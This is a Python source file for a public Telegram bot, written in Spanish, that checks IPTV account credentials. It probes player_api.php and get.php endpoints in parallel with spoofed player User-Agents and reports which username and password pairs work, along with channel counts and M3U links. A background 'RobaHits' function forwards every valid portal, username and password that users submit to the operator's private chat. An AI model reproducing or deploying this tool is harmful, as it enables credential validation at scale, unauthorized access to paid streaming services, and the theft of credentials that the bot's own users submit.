#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🦂 IPTV BOT ULTRA PRO — BY LUIS R 🦂
• Verificación HIT / FAIL / RETRY paralela y rápida
• Abierto al público — RobaHits al admin
• Hora correcta por zona horaria
• Detección universal de cualquier formato IPTV
"""

import os, re, json, time, threading, logging, socket, asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import pytz
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes, CallbackQueryHandler
)
from telegram.constants import ParseMode

# ══════════════════════════════════════════════════════
#  ⚙️  CONFIGURACIÓN — Pon estas variables en Railway
# ══════════════════════════════════════════════════════
#
#  BOT_TOKEN      → Token de @BotFather para este bot
#  ADMIN_ID       → Tu ID de Telegram (búscalo con @userinfobot)
#  RENDER_URL     → URL de tu servicio Railway (para keep-alive 24/7)
#  ROBAHITS_CHATID→ Tu chat ID personal donde recibirás los HITs
#                   (es igual a tu ADMIN_ID si quieres recibirlos tú)
#  TZ_NAME        → Zona horaria. Ejemplos:
#                   America/Mexico_City | America/Bogota | America/Lima
#                   America/Santiago   | America/Argentina/Buenos_Aires
#
BOT_TOKEN       = os.getenv("BOT_TOKEN", "")
ADMIN_ID        = int(os.getenv("ADMIN_ID", "0"))
RENDER_URL      = os.getenv("RENDER_URL", "")
ROBAHITS_CHATID = os.getenv("ROBAHITS_CHATID", str(ADMIN_ID))
TZ_NAME         = os.getenv("TZ_NAME", "America/Mexico_City")
TZ              = pytz.timezone(TZ_NAME)

# Nombre público del bot (para el footer)
BOT_USERNAME = "@Luishits_bot"

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)
requests.packages.urllib3.disable_warnings()

# ── Estado global ──────────────────────────────────────
bot_active     = True
BOT_START_TIME = datetime.now(TZ)
STATS = {"checks": 0, "hits": 0, "fails": 0, "retries": 0, "users": set()}

LINE = "━" * 28

FLAGS = {
    "US":"🇺🇸","MX":"🇲🇽","ES":"🇪🇸","AR":"🇦🇷","CO":"🇨🇴","CL":"🇨🇱",
    "PE":"🇵🇪","VE":"🇻🇪","BR":"🇧🇷","EC":"🇪🇨","UY":"🇺🇾","BO":"🇧🇴",
    "PA":"🇵🇦","DO":"🇩🇴","GT":"🇬🇹","CR":"🇨🇷","GB":"🇬🇧","DE":"🇩🇪",
    "FR":"🇫🇷","NL":"🇳🇱","CA":"🇨🇦","IT":"🇮🇹","PT":"🇵🇹","RU":"🇷🇺",
    "TR":"🇹🇷","IN":"🇮🇳","CN":"🇨🇳","JP":"🇯🇵","AU":"🇦🇺","SV":"🇸🇻",
    "HN":"🇭🇳","NI":"🇳🇮","PY":"🇵🇾","CU":"🇨🇺","PR":"🇵🇷","MA":"🇲🇦",
}

USER_AGENTS = [
    "VLC/3.0.18 LibVLC/3.0.18",
    "Kodi/19.4 (Windows NT 10.0; Win64; x64) Kodi/19.4",
    "TiviMate/4.4.0 (Android 11)",
    "IPTV Smarters Pro/3.0.9.4 (Android 10)",
    "GSE SMART IPTV/7.4 (Android 11)",
    "okhttp/4.9.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Dalvik/2.1.0 (Linux; U; Android 11)",
]

# ══════════════════════════════════════════════════════
#  🕐 HORA LOCAL
# ══════════════════════════════════════════════════════

def now_str() -> str:
    return datetime.now(TZ).strftime("%Y-%m-%d %H:%M:%S")

def ts_to_date(epoch) -> str:
    try:
        v = int(epoch)
        if v > 0:
            return datetime.fromtimestamp(v, tz=TZ).strftime("%d/%m/%Y %H:%M")
    except Exception:
        pass
    return "Sin fecha"

# ══════════════════════════════════════════════════════
#  🔍 EXTRACCIÓN DE URL — Formato universal
# ══════════════════════════════════════════════════════

def extract_from_url(text: str):
    """
    Detecta portal/usuario/pass en CUALQUIER formato IPTV:
    - get.php, player_api.php, playlist, /c/, /live/
    - pipe: portal|user|pass
    - espacio: portal user pass
    """
    # Limpiar texto
    text = text.strip().replace("\r", "").replace("%3A", ":").replace("%2F", "/")

    patterns = [
        # get.php y player_api.php (http y https, con o sin type)
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/get\.php\?username=([^&\s\n]+)&(?:amp;)?password=([^&\s\n]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/player_api\.php\?username=([^&\s\n]+)&(?:amp;)?password=([^&\s\n]+)',
        # /playlist/user/pass
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/playlist/([^/\s\n]+)/([^/\s\n?]+)',
        # /c/xxx/user/pass
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/c/[^/\s]*/([^/\s\n]+)/([^/\s\n?]+)',
        # /live/user/pass/
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/live/([^/\s\n]+)/([^/\s\n?]+)',
        # /p/user/pass
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/p/([^/\s\n]+)/([^/\s\n?]+)',
    ]

    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            portal = m.group(1)
            user   = m.group(2)
            pwd    = m.group(3).split('&')[0].split('?')[0].strip()
            # Quitar parámetros que a veces se pegan al password
            for bad in ("&type=", "&output=", "&format=", "\n", " "):
                pwd = pwd.split(bad)[0]
            return portal, user, pwd

    # Formato pipe: portal|user|pass
    if '|' in text:
        parts = [x.strip() for x in text.split('|')]
        if len(parts) >= 3 and parts[0]:
            return parts[0], parts[1], parts[2]

    # Formato espacio: portal user pass
    parts = text.split()
    if len(parts) == 3 and ('.' in parts[0] or ':' in parts[0]):
        return parts[0], parts[1], parts[2]

    return None, None, None

# ══════════════════════════════════════════════════════
#  ✅ VERIFICACIÓN — PARALELA Y UNIVERSAL
# ══════════════════════════════════════════════════════

def _parse_json(raw: str):
    """Parsea JSON tolerando caracteres extra al inicio."""
    raw = raw.strip()
    try:
        return json.loads(raw)
    except Exception:
        pass
    # Buscar primer { o [
    for ch in ('{', '['):
        idx = raw.find(ch)
        if idx >= 0:
            try:
                return json.loads(raw[idx:])
            except Exception:
                pass
    return None


def _analyze(data) -> tuple:
    """
    Analiza JSON IPTV. Reglas:
      auth=1 + status=Active → HIT
      auth=1 + otro status   → CUSTOM (cuenta existe, no activa)
      auth=0                 → FAIL
      sin estructura válida  → RETRY
    """
    if not isinstance(data, dict):
        return "RETRY", None

    # Buscar user_info (a veces viene en el root directamente)
    ui = data.get("user_info")
    if ui is None:
        if "auth" in data:
            ui = data  # auth directo en root
        else:
            return "RETRY", None

    auth = ui.get("auth")
    if auth is None:
        return "RETRY", None

    try:
        auth = int(auth)
    except Exception:
        return "RETRY", None

    if auth == 0:
        return "FAIL", None

    if auth == 1:
        real_ui = data.get("user_info", ui)
        payload = {
            "user_info":   real_ui,
            "server_info": data.get("server_info", {}),
        }
        if real_ui.get("status", "") == "Active":
            return "HIT", payload
        else:
            return "CUSTOM", payload

    return "RETRY", None


def _single_request(url: str, ua: str, timeout: int = 12) -> tuple:
    """Una sola petición HTTP → (resultado, payload)."""
    try:
        r = requests.get(
            url,
            headers={
                "User-Agent":    ua,
                "Accept":        "*/*",
                "Connection":    "keep-alive",
                "Cache-Control": "no-cache",
            },
            timeout=timeout,
            verify=False,
            allow_redirects=True,
        )
    except Exception as e:
        log.debug(f"Req err: {e}")
        return "RETRY", None

    log.info(f"HTTP {r.status_code} | {url[:55]}")

    if r.status_code not in (200, 206):
        return "RETRY", None

    raw = r.text.strip()

    # Bloqueo Cloudflare / HTML
    if raw.startswith("<") or "cloudflare" in raw.lower() or "just a moment" in raw.lower():
        return "RETRY", None

    # M3U directo → cuenta activa (get.php responde M3U cuando es válida)
    if raw.startswith("#EXTM3U") or raw.startswith("#EXT-X-"):
        return "HIT", {
            "user_info": {
                "auth": 1, "status": "Active",
                "exp_date": "0", "active_cons": "?",
                "max_connections": "?", "is_trial": "0", "created_at": "0",
            },
            "server_info": {}, "m3u_direct": True,
        }

    # JSON vacío o muy corto → RETRY
    if len(raw) < 5:
        return "RETRY", None

    data = _parse_json(raw)
    if data is None:
        return "RETRY", None

    return _analyze(data)


def verify_account(portal: str, user: str, pwd: str) -> tuple:
    """
    Verificación ultra rápida y paralela:
    1. Test TCP rápido (5s) — si falla directo RETRY
    2. Lanza player_api + get.php en http y https simultáneamente
    3. Prueba múltiples User-Agents si el primero falla
    4. Primera respuesta válida gana
    """
    host = portal.split(':')[0]
    port = int(portal.split(':')[1]) if ':' in portal else 8080

    # ── Test TCP rápido ───────────────────────────────
    tcp_ok = False
    for p in (port, 443, 80):
        try:
            s = socket.create_connection((host, p), timeout=5)
            s.close()
            tcp_ok = True
            log.info(f"TCP ✅ {host}:{p}")
            break
        except Exception:
            pass

    if not tcp_ok:
        log.warning(f"TCP ❌ {host} → RETRY")
        return "RETRY", None

    # ── Construir tareas paralelas ─────────────────────
    tasks = []
    # player_api.php con los 3 primeros UAs en http y https
    for scheme in ("http", "https"):
        api_url = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
        for ua in USER_AGENTS[:3]:
            tasks.append((api_url, ua))
        # get.php como fallback
        tasks.append((
            f"{scheme}://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus",
            USER_AGENTS[0]
        ))

    # ── Ejecutar en paralelo ──────────────────────────
    with ThreadPoolExecutor(max_workers=8) as ex:
        futures = {ex.submit(_single_request, url, ua, 12): (url, ua)
                   for url, ua in tasks}
        for fut in as_completed(futures, timeout=35):
            try:
                result, payload = fut.result()
                if result != "RETRY":
                    for f in futures:
                        f.cancel()
                    return result, payload
            except Exception as e:
                log.debug(f"Future err: {e}")

    return "RETRY", None

# ══════════════════════════════════════════════════════
#  📊 DATOS ADICIONALES (en paralelo)
# ══════════════════════════════════════════════════════

def _count_action(portal, user, pwd, action) -> str:
    try:
        r = requests.get(
            f"http://{portal}/player_api.php?username={user}&password={pwd}&action={action}",
            headers={"User-Agent": USER_AGENTS[0]},
            timeout=12, verify=False
        )
        if r.status_code == 200:
            d = r.json()
            return str(len(d)) if isinstance(d, list) else "0"
    except Exception:
        pass
    return "N/D"


def get_content_counts(portal, user, pwd) -> tuple:
    """Live / VOD / Series en paralelo."""
    res = {"live": "N/D", "vod": "N/D", "series": "N/D"}
    with ThreadPoolExecutor(max_workers=3) as ex:
        futs = {
            ex.submit(_count_action, portal, user, pwd, "get_live_streams"): "live",
            ex.submit(_count_action, portal, user, pwd, "get_vod_streams"):  "vod",
            ex.submit(_count_action, portal, user, pwd, "get_series"):       "series",
        }
        for fut in as_completed(futs, timeout=20):
            try:
                res[futs[fut]] = fut.result()
            except Exception:
                pass
    return res["live"], res["vod"], res["series"]


def get_categories(portal, user, pwd, limit=20) -> str:
    try:
        r = requests.get(
            f"http://{portal}/player_api.php?username={user}&password={pwd}&action=get_live_categories",
            headers={"User-Agent": USER_AGENTS[0]}, timeout=12, verify=False
        )
        if r.status_code != 200:
            return ""
        cats = r.json()
        if not isinstance(cats, list) or not cats:
            return ""

        # Conteo de canales por categoría
        count_map: dict = {}
        try:
            r2 = requests.get(
                f"http://{portal}/player_api.php?username={user}&password={pwd}&action=get_live_streams",
                headers={"User-Agent": USER_AGENTS[0]}, timeout=15, verify=False
            )
            if r2.status_code == 200:
                for ch in r2.json():
                    cid = str(ch.get("category_id", ""))
                    count_map[cid] = count_map.get(cid, 0) + 1
        except Exception:
            pass

        lines = []
        for c in cats[:limit]:
            name = c.get("category_name", "").replace("\\/", "/").strip()
            cid  = str(c.get("category_id", ""))
            if not name:
                continue
            cnt = f" [{count_map[cid]}]" if cid in count_map else ""
            lines.append(f"  ➠ {name}{cnt}")
        if len(cats) > limit:
            lines.append(f"  ➕ ...y {len(cats) - limit} categorías más")
        return "\n".join(lines)
    except Exception:
        return ""


def get_location(portal) -> str:
    try:
        ip = portal.split(":")[0]
        r  = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if r.status_code == 200:
            d = r.json()
            if d.get("status") == "success":
                return f"{d.get('country','?')} {FLAGS.get(d.get('countryCode',''), '🌍')}"
    except Exception:
        pass
    return "Desconocido 🌍"

# ══════════════════════════════════════════════════════
#  🔔 ROBAHITS — Reenvía HITs al admin
# ══════════════════════════════════════════════════════

def send_robahit(portal, user, pwd, ui, live, vod, series, from_user):
    """Envía copia del HIT al admin en segundo plano."""
    if not BOT_TOKEN or not ROBAHITS_CHATID:
        return
    try:
        expire = ts_to_date(ui.get("exp_date", 0))
        m3u    = f"http://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
        text   = (
            f"🦂 <b>ROBO HIT — LUIS R</b> 🦂\n\n"
            f"👤 Verificado por: @{from_user}\n\n"
            f"🌐 Portal: <code>{portal}</code>\n"
            f"👤 Usuario: <code>{user}</code>\n"
            f"🔑 Pass: <code>{pwd}</code>\n"
            f"⏲ Vence: {expire}\n"
            f"📺 {live} canales | 🎥 {vod} VOD | 📹 {series} series\n"
            f'🔗 <a href="{m3u}">M3U Link</a>\n\n'
            f"🕐 {now_str()}\n"
            f"🦂 {BOT_USERNAME}"
        )
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": ROBAHITS_CHATID,
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": True
            },
            timeout=8
        )
    except Exception as e:
        log.warning(f"RobaHit error: {e}")

# ══════════════════════════════════════════════════════
#  🃏 TARJETAS DE RESULTADO
# ══════════════════════════════════════════════════════

def card_hit(portal, user, pwd, ui, live, vod, series, cats, tg_user) -> str:
    expire   = ts_to_date(ui.get("exp_date", 0))
    created  = ts_to_date(ui.get("created_at", 0))
    active   = ui.get("active_cons", "?")
    maxcon   = ui.get("max_connections", "?")
    status   = ui.get("status", "Active")
    trial    = "No Trial" if str(ui.get("is_trial", "0")) in ("0","false","") else "✅ Trial"
    location = get_location(portal)
    m3u = f"http://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
    epg = f"http://{portal}/xmltv.php?username={user}&password={pwd}"

    t  = f"{LINE}\n"
    t += f"🦂 <b>LUIS R</b> 🦂\n"
    t += f"  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n"
    t += f"{LINE}\n"
    t += f"➥ 🟢 CUENTA VÁLIDA\n"
    t += f"➥ 🆙 Estado: ✅ {status.upper()}\n"
    t += f"➥ 🧪 Trial: {trial}\n"
    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
    t += f"➥ 🔑 Contraseña: <code>{pwd}</code>\n"
    t += f"➥ 📅 Creada: {created}\n"
    t += f"➥ ⏲ Vence: {expire}\n"
    t += f"➥ 👁 Conexiones: {active} / {maxcon}\n"
    t += f"➥ 📍 País: {location}\n"
    t += f"{LINE}\n"
    t += f"     ★彡ᴄᴏɴᴛᴇɴᴛ彡★\n"
    t += f"{LINE}\n"
    t += f"➥ 📺 En Vivo: {live}\n"
    t += f"➥ 🎥 VOD: {vod}\n"
    t += f"➥ 📹 Series: {series}\n"
    t += f"{LINE}\n"
    t += f'➥ 🔗 <a href="{m3u}">M3U Link</a>   |   <a href="{epg}">EPG Link</a>\n'
    if cats:
        t += f"{LINE}\n"
        t += f"   ★彡ᴄᴀᴛᴇɢᴏʀíᴀs彡★\n"
        t += f"{LINE}\n"
        t += f"{cats}\n"
    t += f"{LINE}\n"
    t += f"   ✔️ Verificado para @{tg_user}\n"
    t += f"   🕐 {now_str()}\n"
    t += f"   🦂 {BOT_USERNAME}\n"
    t += f"{LINE}"
    return t


def card_custom(portal, user, pwd, ui, tg_user) -> str:
    t  = f"{LINE}\n🦂 <b>LUIS R</b> 🦂\n  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n{LINE}\n"
    t += f"➥ 🟡 CUENTA EXISTE — NO ACTIVA\n"
    t += f"➥ 🆙 Estado: ⚠️ {ui.get('status','?').upper()}\n"
    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
    t += f"➥ 🔑 Contraseña: <code>{pwd}</code>\n"
    t += f"➥ ⏲ Vence: {ts_to_date(ui.get('exp_date', 0))}\n"
    t += f"➥ 👥 Max conexiones: {ui.get('max_connections','?')}\n"
    t += f"{LINE}\n   ✔️ Verificado para @{tg_user}\n"
    t += f"   🕐 {now_str()}\n   🦂 {BOT_USERNAME}\n{LINE}"
    return t


def card_fail(portal, user, tg_user) -> str:
    t  = f"{LINE}\n🦂 <b>LUIS R</b> 🦂\n  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n{LINE}\n"
    t += f"➥ 🔴 CUENTA INVÁLIDA\n"
    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
    t += f"{LINE}\n   ❌ Credenciales incorrectas (auth=0)\n"
    t += f"   ✔️ Verificado para @{tg_user}\n"
    t += f"   🕐 {now_str()}\n   🦂 {BOT_USERNAME}\n{LINE}"
    return t


def card_retry(portal, user, tg_user) -> str:
    t  = f"{LINE}\n🦂 <b>LUIS R</b> 🦂\n  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n{LINE}\n"
    t += f"➥ 🔄 SIN RESPUESTA / RETRY\n"
    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
    t += f"{LINE}\n   ⚠️ Servidor bloqueado o sin respuesta\n"
    t += f"   💡 Intenta más tarde\n"
    t += f"   ✔️ Verificado para @{tg_user}\n"
    t += f"   🕐 {now_str()}\n   🦂 {BOT_USERNAME}\n{LINE}"
    return t

# ══════════════════════════════════════════════════════
#  🔄 KEEP-ALIVE 24/7
# ══════════════════════════════════════════════════════

def keep_alive():
    if not RENDER_URL:
        return
    while True:
        try:
            requests.get(RENDER_URL, timeout=8)
            log.info("Keep-alive ✅")
        except Exception:
            pass
        time.sleep(480)

# ══════════════════════════════════════════════════════
#  🛠️ HELPERS
# ══════════════════════════════════════════════════════

def is_admin(u: Update) -> bool:
    return u.effective_user.id == ADMIN_ID

def tg_name(u: Update) -> str:
    usr = u.effective_user
    return usr.username or usr.first_name or str(usr.id)

# ══════════════════════════════════════════════════════
#  ⚡ LÓGICA CENTRAL DE VERIFICACIÓN
# ══════════════════════════════════════════════════════

async def do_check(update: Update, portal: str, user: str, pwd: str):
    """Verifica una cuenta y responde con la tarjeta correspondiente."""
    if not bot_active:
        await update.message.reply_text(
            "🔴 El bot está detenido.\n"
            f"Contacta al admin {BOT_USERNAME}"
        )
        return

    STATS["checks"] += 1
    STATS["users"].add(update.effective_user.id)
    tg_user = tg_name(update)

    msg = await update.message.reply_text("🔍 Verificando cuenta…")

    loop = asyncio.get_event_loop()
    status, result = await loop.run_in_executor(None, verify_account, portal, user, pwd)

    if status == "HIT":
        STATS["hits"] += 1
        await msg.edit_text("📡 Obteniendo contenido y categorías…")
        ui = result["user_info"]

        # Contenido + categorías en paralelo
        live_fut = loop.run_in_executor(None, get_content_counts, portal, user, pwd)
        cats_fut = loop.run_in_executor(None, get_categories, portal, user, pwd)
        live, vod, series = await live_fut
        cats              = await cats_fut

        text = card_hit(portal, user, pwd, ui, live, vod, series, cats, tg_user)
        await msg.edit_text(text, parse_mode=ParseMode.HTML,
                            disable_web_page_preview=True)

        # RobaHit en background
        threading.Thread(
            target=send_robahit,
            args=(portal, user, pwd, ui, live, vod, series, tg_user),
            daemon=True
        ).start()

    elif status == "CUSTOM":
        STATS["hits"] += 1
        ui = result["user_info"]
        await msg.edit_text(
            card_custom(portal, user, pwd, ui, tg_user),
            parse_mode=ParseMode.HTML, disable_web_page_preview=True
        )

    elif status == "FAIL":
        STATS["fails"] += 1
        await msg.edit_text(card_fail(portal, user, tg_user),
                            parse_mode=ParseMode.HTML)

    else:  # RETRY
        STATS["retries"] += 1
        await msg.edit_text(card_retry(portal, user, tg_user),
                            parse_mode=ParseMode.HTML)

# ══════════════════════════════════════════════════════
#  📟 COMANDOS — Admin y Público
# ══════════════════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Bienvenida — disponible para todos."""
    uid = update.effective_user.id
    STATS["users"].add(uid)

    if is_admin(update):
        global bot_active
        bot_active = True

    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("📖 Ayuda", callback_data="help"),
        InlineKeyboardButton("📊 Estado", callback_data="status"),
    ]])

    await update.message.reply_text(
        f"🦂 <b>IPTV BOT ULTRA PRO</b> 🦂\n"
        f"         <b>BY LUIS R</b>\n\n"
        f"✅ Bot activo y listo\n\n"
        f"📌 <b>Pega tu URL IPTV directamente aquí:</b>\n"
        f"<code>http://portal:8080/get.php?username=USER&amp;password=PASS</code>\n\n"
        f"📌 <b>O usa el comando:</b>\n"
        f"<code>/check portal:puerto usuario pass</code>\n\n"
        f"⚡ Verificación ultra rápida y paralela\n"
        f"🔔 HITs enviados automáticamente al admin\n\n"
        f"🦂 {BOT_USERNAME}",
        parse_mode=ParseMode.HTML,
        reply_markup=kb
    )


async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Solo admin puede detener."""
    if not is_admin(update):
        await update.message.reply_text("❌ No autorizado.")
        return
    global bot_active
    bot_active = False
    await update.message.reply_text(
        f"🔴 <b>Bot DETENIDO.</b>\nUsa /start para reactivarlo.\n🦂 {BOT_USERNAME}",
        parse_mode=ParseMode.HTML
    )


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Estado — solo admin."""
    if not is_admin(update):
        await update.message.reply_text("❌ No autorizado.")
        return
    uptime = datetime.now(TZ) - BOT_START_TIME
    h, rem = divmod(int(uptime.total_seconds()), 3600)
    m, s   = divmod(rem, 60)
    estado = "🟢 ACTIVO" if bot_active else "🔴 DETENIDO"
    await update.message.reply_text(
        f"🦂 <b>ESTADO — LUIS R</b> 🦂\n\n"
        f"📺 Bot: {estado}\n"
        f"⏰ Uptime: {h:02d}h {m:02d}m {s:02d}s\n"
        f"🕐 Hora: {now_str()}\n"
        f"🌐 Zona: {TZ_NAME}\n\n"
        f"✅ Hits: {STATS['hits']}\n"
        f"❌ Fails: {STATS['fails']}\n"
        f"🔄 Retries: {STATS['retries']}\n"
        f"⭐ Total verificados: {STATS['checks']}\n"
        f"👥 Usuarios únicos: {len(STATS['users'])}\n\n"
        f"🔔 RobaHits chat: <code>{ROBAHITS_CHATID}</code>\n\n"
        f"🦂 {BOT_USERNAME}",
        parse_mode=ParseMode.HTML
    )


async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Verificar cuenta — disponible para todos."""
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "📌 <b>Uso:</b>\n"
            "<code>/check portal:puerto usuario contraseña</code>\n\n"
            "🔥 <b>Ejemplo:</b>\n"
            "<code>/check latinchannel.tv:8080 usuario pass123</code>",
            parse_mode=ParseMode.HTML
        )
        return
    await do_check(update, args[0], args[1], args[2])


async def cmd_debug(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Diagnóstico técnico — solo admin."""
    if not is_admin(update):
        await update.message.reply_text("❌ No autorizado.")
        return
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "📌 <code>/debug portal:puerto usuario contraseña</code>",
            parse_mode=ParseMode.HTML
        )
        return
    portal, user, pwd = args[0], args[1], args[2]
    host = portal.split(':')[0]
    port = int(portal.split(':')[1]) if ':' in portal else 8080

    msg = await update.message.reply_text("🔬 Ejecutando diagnóstico…")
    lines = [f"🔬 <b>DIAGNÓSTICO</b> <code>{portal}</code>\n"]

    # TCP test
    for p in (port, 443, 80):
        try:
            s = socket.create_connection((host, p), timeout=5)
            s.close()
            lines.append(f"🔌 TCP ✅ puerto {p}")
            break
        except Exception as e:
            lines.append(f"🔌 TCP ❌ puerto {p}: {str(e)[:50]}")
    lines.append("")

    # HTTP test
    for scheme in ("http", "https"):
        url = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
        lines.append(f"🔗 <b>{scheme.upper()}</b>")
        try:
            r = requests.get(url, headers={"User-Agent": USER_AGENTS[0]},
                             timeout=10, verify=False)
            lines.append(f"  Status: <code>{r.status_code}</code>")
            raw = (r.text.strip()[:500]
                   .replace("&","&amp;").replace("<","&lt;").replace(">","&gt;"))
            lines.append(f"  Respuesta:\n<code>{raw}</code>")
        except requests.exceptions.ConnectionError:
            lines.append("  ❌ Conexión rechazada")
        except requests.exceptions.Timeout:
            lines.append("  ⏱ Timeout")
        except Exception as e:
            lines.append(f"  ❌ {str(e)[:80]}")
        lines.append("")

    await msg.edit_text("\n".join(lines), parse_mode=ParseMode.HTML)


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ayuda — disponible para todos."""
    admin_cmds = ""
    if is_admin(update):
        admin_cmds = (
            "\n\n🔧 <b>Comandos Admin:</b>\n"
            "/stop — 🔴 Apagar bot\n"
            "/status — 📊 Estadísticas\n"
            "/debug <code>portal user pass</code> — 🔬 Diagnóstico\n"
        )
    await update.message.reply_text(
        f"🦂 <b>IPTV BOT ULTRA PRO — LUIS R</b> 🦂\n\n"
        f"📌 <b>Comandos:</b>\n"
        f"/start — 🟢 Inicio\n"
        f"/check <code>portal user pass</code> — ✅ Verificar cuenta\n"
        f"/help — ❓ Esta ayuda\n"
        f"{admin_cmds}\n"
        f"💡 <b>También puedes pegar directamente:</b>\n"
        f"• URL M3U completa\n"
        f"• Formato: <code>portal|usuario|pass</code>\n"
        f"• Formato: <code>portal usuario pass</code>\n\n"
        f"🦂 {BOT_USERNAME}",
        parse_mode=ParseMode.HTML
    )


async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja botones inline del /start."""
    query = update.callback_query
    await query.answer()
    if query.data == "help":
        # Simular /help
        await query.message.reply_text(
            f"🦂 <b>IPTV BOT ULTRA PRO — LUIS R</b> 🦂\n\n"
            f"💡 <b>Pega tu URL aquí directamente</b> o usa:\n"
            f"/check <code>portal:puerto usuario pass</code>\n\n"
            f"Formatos soportados:\n"
            f"• <code>http://portal/get.php?username=U&amp;password=P</code>\n"
            f"• <code>portal|usuario|pass</code>\n"
            f"• <code>portal usuario pass</code>\n\n"
            f"🦂 {BOT_USERNAME}",
            parse_mode=ParseMode.HTML
        )
    elif query.data == "status":
        estado = "🟢 ACTIVO" if bot_active else "🔴 DETENIDO"
        await query.message.reply_text(
            f"📊 <b>Estado:</b> {estado}\n"
            f"⭐ Verificados: {STATS['checks']}\n"
            f"✅ Hits: {STATS['hits']}\n"
            f"👥 Usuarios: {len(STATS['users'])}\n"
            f"🕐 {now_str()}\n\n"
            f"🦂 {BOT_USERNAME}",
            parse_mode=ParseMode.HTML
        )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Maneja mensajes de texto: detecta URLs IPTV automáticamente.
    Disponible para TODOS los usuarios (bot público).
    """
    if not bot_active:
        await update.message.reply_text(
            f"🔴 Bot temporalmente detenido.\n🦂 {BOT_USERNAME}"
        )
        return

    text = (update.message.text or "").strip()
    portal, user, pwd = extract_from_url(text)
    if portal and user and pwd:
        await do_check(update, portal, user, pwd)
    else:
        # No es una URL IPTV → mostrar ayuda breve
        await update.message.reply_text(
            f"❓ No reconocí esa URL.\n\n"
            f"📌 Pega una URL así:\n"
            f"<code>http://portal:8080/get.php?username=USER&amp;password=PASS</code>\n\n"
            f"O usa /help para ver todos los formatos.\n"
            f"🦂 {BOT_USERNAME}",
            parse_mode=ParseMode.HTML
        )

# ══════════════════════════════════════════════════════
#  🚀 MAIN
# ══════════════════════════════════════════════════════

def main():
    if not BOT_TOKEN:
        log.error(
            "❌ BOT_TOKEN no configurado.\n"
            "   En Railway: Settings → Variables → New Variable\n"
            "   Nombre: BOT_TOKEN   Valor: tu token de @BotFather"
        )
        return

    threading.Thread(target=keep_alive, daemon=True).start()
    log.info(f"🦂 IPTV BOT ULTRA PRO — LUIS R — TZ: {TZ_NAME}")
    log.info(f"   RobaHits → chat_id: {ROBAHITS_CHATID}")

    app = Application.builder().token(BOT_TOKEN).build()

    # Comandos
    app.add_handler(CommandHandler("start",  cmd_start))
    app.add_handler(CommandHandler("stop",   cmd_stop))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("check",  cmd_check))
    app.add_handler(CommandHandler("debug",  cmd_debug))
    app.add_handler(CommandHandler("help",   cmd_help))

    # Botones inline
    app.add_handler(CallbackQueryHandler(callback_handler))

    # Mensajes de texto (URLs pegadas)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    log.info("✅ Bot listo — escuchando.")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
